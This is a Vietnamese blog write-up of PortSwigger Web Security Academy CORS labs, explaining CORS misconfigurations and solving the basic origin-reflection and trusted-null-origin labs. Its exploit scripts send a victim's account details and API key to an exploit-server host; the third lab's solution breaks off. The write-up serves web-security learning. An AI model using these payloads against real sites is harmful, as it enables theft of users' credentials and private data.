<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUpOverview về CORSCORS là gì? Vì sao lại xuất hiện CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài">
<meta property="og:type" content="article">
<meta property="og:title" content="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp">
<meta property="og:url" content="https://pzhat.github.io/2025/11/16/2025-11-16-CORS-PortSwigger/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUpOverview về CORSCORS là gì? Vì sao lại xuất hiện CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-16T09:11:55.936Z">
<meta property="article:modified_time" content="2025-12-05T14:16:06.394Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="PortSwigger">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp",
  "url": "https://pzhat.github.io/2025/11/16/2025-11-16-CORS-PortSwigger/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-16T09:11:55.936Z",
  "dateModified": "2025-12-05T14:16:06.394Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/16/2025-11-16-CORS-PortSwigger/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-16T09:11:55.936Z" title="Created 2025-11-16 16:11:55">2025-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-05T14:16:06.394Z" title="Updated 2025-12-05 21:16:06">2025-12-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PortSwigger-CORS-Cross-Origin-Resource-Sharing-challenge-WriteUp"><a href="#PortSwigger-CORS-Cross-Origin-Resource-Sharing-challenge-WriteUp" class="headerlink" title="PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp"></a>PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp</h1><h3 id="Overview-ve-CORS"><a href="#Overview-ve-CORS" class="headerlink" title="Overview về CORS"></a>Overview về CORS</h3><h4 id="CORS-la-gi-Vi-sao-lai-xuat-hien"><a href="#CORS-la-gi-Vi-sao-lai-xuat-hien" class="headerlink" title="CORS là gì? Vì sao lại xuất hiện"></a>CORS là gì? Vì sao lại xuất hiện</h4><ul>
<li><p>CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài nguyên trên một máy chủ được chia sẻ với các trang web có nguồn (origin) khác. “Nguồn” ở đây được định nghĩa bởi ba yếu tố: giao thức (http, https), tên miền (domain), và cổng (port).</p>
</li>
<li><p>Theo mặc định, các trình duyệt web tuân thủ Chính sách Cùng Nguồn Gốc (Same-Origin Policy - SOP). Chính sách này là một biện pháp bảo mật nền tảng, ngăn chặn một trang web từ nguồn A đọc dữ liệu từ một trang web ở nguồn B. Ví dụ, một script chạy trên <a target="_blank" rel="noopener" href="https://your-bank.com/">https://your-bank.com</a> không thể tự ý gửi yêu cầu đến <a target="_blank" rel="noopener" href="https://evil-website.com/">https://evil-website.com</a> và đọc phản hồi.</p>
</li>
<li><p>Tuy nhiên, trong các ứng dụng web hiện đại, việc gọi API từ một tên miền khác, nhúng phông chữ, hoặc tải tài nguyên từ các mạng phân phối nội dung (CDN) là rất phổ biến. CORS ra đời để nới lỏng chính sách SOP một cách có kiểm soát, cho phép chia sẻ tài nguyên giữa các nguồn khác nhau một cách an toàn.</p>
</li>
</ul>
<h4 id="Co-che-hoat-dong-cua-CORS"><a href="#Co-che-hoat-dong-cua-CORS" class="headerlink" title="Cơ chế hoạt động của CORS"></a>Cơ chế hoạt động của CORS</h4><p>Cơ chế CORS hoạt động dựa trên việc trao đổi các HTTP header giữa trình duyệt và máy chủ:</p>
<ul>
<li>Khi một trang web (ví dụ <a target="_blank" rel="noopener" href="https://client.com/">https://client.com</a>) muốn yêu cầu một tài nguyên từ một nguồn khác (ví dụ <a target="_blank" rel="noopener" href="https://api.server.com/data">https://api.server.com/data</a>), trình duyệt sẽ tự động thêm một HTTP header vào yêu cầu: Origin: <a target="_blank" rel="noopener" href="https://client.com/">https://client.com</a>.</li>
<li>Máy chủ api.server.com nhận được yêu cầu, nó sẽ kiểm tra giá trị của header Origin.</li>
<li>Nếu máy chủ cho phép nguồn này truy cập, nó sẽ trả về một phản hồi kèm theo header Access-Control-Allow-Origin. Giá trị của header này có thể là nguồn đã yêu cầu (<a target="_blank" rel="noopener" href="https://client.com/">https://client.com</a>) hoặc một dấu sao (*) để cho phép tất cả các nguồn.</li>
<li>Trình duyệt nhận được phản hồi, kiểm tra header Access-Control-Allow-Origin. Nếu nguồn được cho phép, trình duyệt sẽ cho phép mã JavaScript của trang web đọc dữ liệu phản hồi. Ngược lại, nếu header này thiếu hoặc không khớp, trình duyệt sẽ chặn yêu cầu và báo lỗi CORS.</li>
</ul>
<h4 id="Co-hai-loai-yeu-cau-CORS-chinh"><a href="#Co-hai-loai-yeu-cau-CORS-chinh" class="headerlink" title="Có hai loại yêu cầu CORS chính:"></a>Có hai loại yêu cầu CORS chính:</h4><ul>
<li>Yêu cầu đơn giản (Simple Request): Áp dụng cho các yêu cầu sử dụng phương thức GET, HEAD, POST và chỉ chứa các header đơn giản. Trình duyệt gửi thẳng yêu cầu và kiểm tra CORS ở phản hồi.</li>
<li>Yêu cầu “phức tạp” (Preflight Request): Đối với các yêu cầu “phức tạp” hơn (ví dụ: sử dụng phương thức PUT, DELETE hoặc có các custom header), trình duyệt sẽ gửi trước một yêu cầu OPTIONS (gọi là “preflight request”) để “hỏi” máy chủ xem yêu cầu chính thức có được phép hay không. Nếu máy chủ đồng ý, trình duyệt mới gửi yêu cầu thực sự.</li>
</ul>
<h4 id="Cac-lo-hong-bao-mat-CORS-pho-bien"><a href="#Cac-lo-hong-bao-mat-CORS-pho-bien" class="headerlink" title="Các lỗ hổng bảo mật CORS phổ biến"></a>Các lỗ hổng bảo mật CORS phổ biến</h4><p>Lỗ hổng CORS xảy ra khi máy chủ được cấu hình sai, cho phép các nguồn không đáng tin cậy truy cập vào các tài nguyên nhạy cảm.</p>
<h4 id="Cau-hinh-Access-Control-Allow-Origin-qua-rong-rai-day-la-loi-pho-bien-va-nguy-hiem-nhat"><a href="#Cau-hinh-Access-Control-Allow-Origin-qua-rong-rai-day-la-loi-pho-bien-va-nguy-hiem-nhat" class="headerlink" title="Cấu hình Access-Control-Allow-Origin quá rộng rãi đây là lỗi phổ biến và nguy hiểm nhất:"></a>Cấu hình Access-Control-Allow-Origin quá rộng rãi đây là lỗi phổ biến và nguy hiểm nhất:</h4><ul>
<li>Access-Control-Allow-Origin: *: Cấu hình này cho phép bất kỳ trang web nào trên Internet gửi yêu cầu và đọc phản hồi từ máy chủ của bạn. Nếu tài nguyên trả về chứa thông tin nhạy cảm (như thông tin cá nhân người dùng, token API), kẻ tấn công có thể tạo một trang web độc hại để đánh cắp dữ liệu này.</li>
<li>Phản chiếu động giá trị Origin: Một số nhà phát triển cấu hình máy chủ để đọc header Origin từ yêu cầu và phản chiếu lại giá trị đó trong Access-Control-Allow-Origin mà không kiểm tra. Điều này về cơ bản tương đương với việc dùng *, cho phép mọi nguồn truy cập.</li>
</ul>
<h4 id="Cau-hinh-sai-Whitelist"><a href="#Cau-hinh-sai-Whitelist" class="headerlink" title="Cấu hình sai Whitelist"></a>Cấu hình sai Whitelist</h4><ul>
<li>Đôi khi, logic kiểm tra danh sách các nguồn được phép có thể bị lỗi. Ví dụ, một trang web chỉ kiểm tra xem tên miền có kết thúc bằng trusted-site.com hay không. Kẻ tấn công có thể đăng ký một tên miền như malicious-trusted-site.com để vượt qua bộ lọc.</li>
</ul>
<h4 id="Lam-dung-Access-Control-Allow-Credentials-true"><a href="#Lam-dung-Access-Control-Allow-Credentials-true" class="headerlink" title="Lạm dụng Access-Control-Allow-Credentials: true"></a>Lạm dụng Access-Control-Allow-Credentials: true</h4><ul>
<li>Khi một yêu cầu cần gửi kèm thông tin xác thực (như cookie hoặc header Authorization), header Access-Control-Allow-Credentials phải được đặt là true. Nếu cấu hình này được kết hợp với một Access-Control-Allow-Origin quá rộng rãi, nó sẽ tạo ra một lỗ hổng nghiêm trọng, cho phép kẻ tấn công thực hiện các yêu cầu đã được xác thực thay mặt người dùng và đánh cắp dữ liệu nhạy cảm.</li>
</ul>
<h4 id="Lo-hong-tu-Origin-null"><a href="#Lo-hong-tu-Origin-null" class="headerlink" title="Lỗ hổng từ Origin: null"></a>Lỗ hổng từ Origin: null</h4><ul>
<li>Một số tình huống, chẳng hạn như khi mở một tệp HTML cục bộ, có thể tạo ra yêu cầu với Origin: null. Nếu máy chủ cho phép nguồn null này, nó có thể vô tình cho phép các tệp độc hại trên máy người dùng truy cập tài nguyên.</li>
</ul>
<h3 id="Di-vao-phan-tich-va-giai-tung-lab"><a href="#Di-vao-phan-tich-va-giai-tung-lab" class="headerlink" title="Đi vào phân tích và giải từng lab"></a>Đi vào phân tích và giải từng lab</h3><h4 id="Lab-CORS-vulnerability-with-basic-origin-reflection"><a href="#Lab-CORS-vulnerability-with-basic-origin-reflection" class="headerlink" title="Lab: CORS vulnerability with basic origin reflection"></a>Lab: CORS vulnerability with basic origin reflection</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This website has an insecure CORS configuration in that it trusts all origins.</span><br><span class="line"></span><br><span class="line">To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator&#x27;s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator&#x27;s API key.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p>Lab này bảo ta lấy API key của admin bằng code JS để exploit ở đây ta được cấp sẵn acc thường đó là <code>wiener:peter</code> bây giờ mình sẽ đăng nhập vào xem thử có những gì bên trong web này.</p>
<p><img src="https://hackmd.io/_uploads/HyvqRELxbx.png" alt="image"></p>
<p>Ở đây sau khi đăng nhập ta sẽ được cấp một cái API key, ở đây là key của user wiener. </p>
<p><img src="https://hackmd.io/_uploads/Sk6EeSUl-x.png" alt="image"></p>
<p>Tại đây sau khi đăng nhập ta để ý rằng có một request GET thông tin chi tiết của account đăng nhập, response trả về cho ta đúng với GUI nhưng ở đây ta để ý ở trường <code>Access-Control-Allow-Credentials: true</code> ở response và trường <code>Sec-Fetch-Site: same-origin</code> ở request ở đây trong trường hợp này, một số application thường mở thêm access cho một số domain khác và nếu config và kiểm soát không đúng cách thì sẽ dính lỗi.</p>
<p>Ở đây mình sẽ thêm một trường nữa là Origin xem thử nó có reflect cái domain trở về trong response không để khẳng định.</p>
<p><img src="https://hackmd.io/_uploads/H1cubBUg-x.png" alt="image"></p>
<p>Và kết quả như dự tính thì nó đã reflected cái domain trở về vì nó config lỗi như vậy nên kết quả là domain nào cũng đều có thể truy cập vào tài nguyên của con web app bị lỗi.</p>
<p>Bây giờ ta sẽ tạo code JS để exploit cái lỗi này.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="property">onload</span> = reqListener;</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://0a310000045184f0817316af00340031.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">    req.<span class="title function_">send</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;</span><br><span class="line">        location=<span class="string">&#x27;/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Các thành phần chính:</p>
<ul>
<li>Tạo XMLHttpRequest</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure>

<p>Đây là đối tượng dùng để gửi request HTTP từ trình duyệt.</p>
<ul>
<li>Mở request đến domain khác.</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://0a310000045184f0817316af00340031.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="title class_">Script</span> gửi request <span class="variable constant_">GET</span> đến endpoint /accountDetails của một website khá<span class="title function_">c</span> (ở đây là lab vulnerable).</span><br></pre></td></tr></table></figure>

<ul>
<li>Gửi kèm cookie phiên của nạn nhân</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>Thuộc tính này buộc trình duyệt gửi cookie&#x2F;session của người dùng hiện tại cùng với request cross-origin.</p>
<p>Sau khi đẩy exploit code lên thì ta sẽ truy cập vào server log để xem những request.</p>
<p><img src="https://hackmd.io/_uploads/Hk2SQBUlZl.png" alt="image"></p>
<p>Ta thấy nó trả về một GET request với nội dung cùa đường dẫn <code>/accountDetails</code> bây giờ vì nó được URL encode nên ta chỉ cần decode nó ra để đọc được nội dung bên trong.</p>
<p><img src="https://hackmd.io/_uploads/SyzoQBIx-e.png" alt="image"></p>
<p>Thành công lấy được API key của admin rồi thành công solve.</p>
<h4 id="Lab-CORS-vulnerability-with-trusted-null-origin"><a href="#Lab-CORS-vulnerability-with-trusted-null-origin" class="headerlink" title="Lab: CORS vulnerability with trusted null origin"></a>Lab: CORS vulnerability with trusted null origin</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This website has an insecure CORS configuration in that it trusts the &quot;null&quot; origin.</span><br><span class="line"></span><br><span class="line">To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator&#x27;s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator&#x27;s API key.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p>Với lab thứ 2 thì mọi thứ nhìn sẽ tương tự như bài lab đầu tiên nên ta đi thằng vào request <code>/accountDetails</code> luôn.</p>
<p><img src="https://hackmd.io/_uploads/rkyfeL8gZx.png" alt="image"></p>
<p>Request nó cũng giống như lab trước và ở response vẫn có trường <code>Access-Control-Allow-Credentials: true</code> nên liệu nếu ta để vào một cái origin bừa nó có nhận không nhỉ.</p>
<p><img src="https://hackmd.io/_uploads/HkZCxI8xZe.png" alt="image"></p>
<p>Ở đây ta gửi thêm 1 cái origin mình thêm là <code>adudu.com</code> thì có thể thấy ở phần response rằng cái origin nó không được reflect lại có vẻ như nó đã whitelist lại vậy nên ta sẽ thử với giá trị null xem sao.</p>
<p><img src="https://hackmd.io/_uploads/B1d_WLLl-x.png" alt="image"></p>
<p>Ta có thể thấy với giá trị null thì nó trả cho ta trường <code>Access-Control-Allow-Origin: null</code> vậy là nó cho phép truy cập tài nguyên với giá trị của origin là null có nghĩa là server sẽ tin tưởng tất cả các request nào có <code>Origin: null</code>.</p>
<p>Vậy bây giờ ta có kịch bản tạo payload là: </p>
<ul>
<li><p>Attacker tạo một trang chứa iframe sandbox hoặc data: URI.</p>
</li>
<li><p>Trình duyệt gửi request đến server với Origin: null.</p>
</li>
<li><p>Server phản hồi với Access-Control-Allow-Origin: null và Access-Control-Allow-Credentials: true.</p>
</li>
<li><p>Trình duyệt cho phép script của attacker đọc dữ liệu nhạy cảm từ response.</p>
</li>
<li><p>Dữ liệu bị rò rỉ sang domain của attacker.</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=<span class="string">&quot;&lt;script&gt;</span></span><br><span class="line"><span class="string">    var req = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">    req.onload = reqListener;</span></span><br><span class="line"><span class="string">    req.open(&#x27;get&#x27;,&#x27;https://0a8900670307b3d881b9fc1800bc00b3.web-security-academy.net/accountDetails&#x27;,true);</span></span><br><span class="line"><span class="string">    req.withCredentials = true;</span></span><br><span class="line"><span class="string">    req.send();</span></span><br><span class="line"><span class="string">    function reqListener() &#123;</span></span><br><span class="line"><span class="string">        location=&#x27;https://exploit-0a6300b80320b356810dfbb301050042.exploit-server.net//log?key=&#x27;+encodeURIComponent(this.responseText);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>Đây là payload để khai thác lab trên bây giờ ném nó vào exploit server và gửi đến cho victim.</p>
<p><img src="https://hackmd.io/_uploads/B1d3rULgWg.png" alt="image"></p>
<p>Truy cập vào access log ta thấy rằng victim đã click vào đường dẫn payload và nó trả về kết quả cho ta bây giờ URL decode nó ra.</p>
<p><img src="https://hackmd.io/_uploads/Bym-L8UxZl.png" alt="image"></p>
<p>Thành công decode và lấy được admin API key.</p>
<p><img src="https://hackmd.io/_uploads/ryHXIUUlZg.png" alt="image"></p>
<h4 id="Lab-CORS-vulnerability-with-trusted-insecure-protocols"><a href="#Lab-CORS-vulnerability-with-trusted-insecure-protocols" class="headerlink" title="Lab: CORS vulnerability with trusted insecure protocols"></a>Lab: CORS vulnerability with trusted insecure protocols</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.</span><br><span class="line"></span><br><span class="line">To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator&#x27;s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator&#x27;s API key.</span><br><span class="line"></span><br><span class="line">You can log in to your own account using the following credentials: wiener:peter</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/Sk7aa-ve-l.png" alt="image"></p>
<p>Ở đây ta vẫn có chức năng tương tự như 2 lab ở phía trước bây giờ đi sâu vào request mà ta khai thác từ nãy đến giờ.</p>
<p><img src="https://hackmd.io/_uploads/BkbBRbPx-x.png" alt="image"></p>
<p>Ở request này ta để ý rằng vẫn còn trường <code>Access-Control-Allow-Credentials: true</code> thì nó vẫn sẽ còn CORS. Nghĩa là server cho phép chia sẻ cookie&#x2F;phiên đăng nhập qua CORS. Bây giờ tiếp tục xem request.</p>
<p><img src="https://hackmd.io/_uploads/SybRCZPlZx.png" alt="image"></p>
<p>Với origin là null giống bài trước thì ta có thể thấy rằng nó không reflect về chứng tỏ nó không cho phép truy cập bây giờ ta sẽ thử với domain khác.</p>
<p><img src="https://hackmd.io/_uploads/BkB4xGDx-l.png" alt="image"></p>
<p>Ở đây tôi thử với subdomain tự chế từ domain chính thì nó lập tức reflect lại có nghĩa rằng bất kỳ subdomain nào (HTTP hoặc HTTPS) đều được phép truy cập.</p>
<p><img src="https://hackmd.io/_uploads/HyboZfPl-x.png" alt="image"></p>
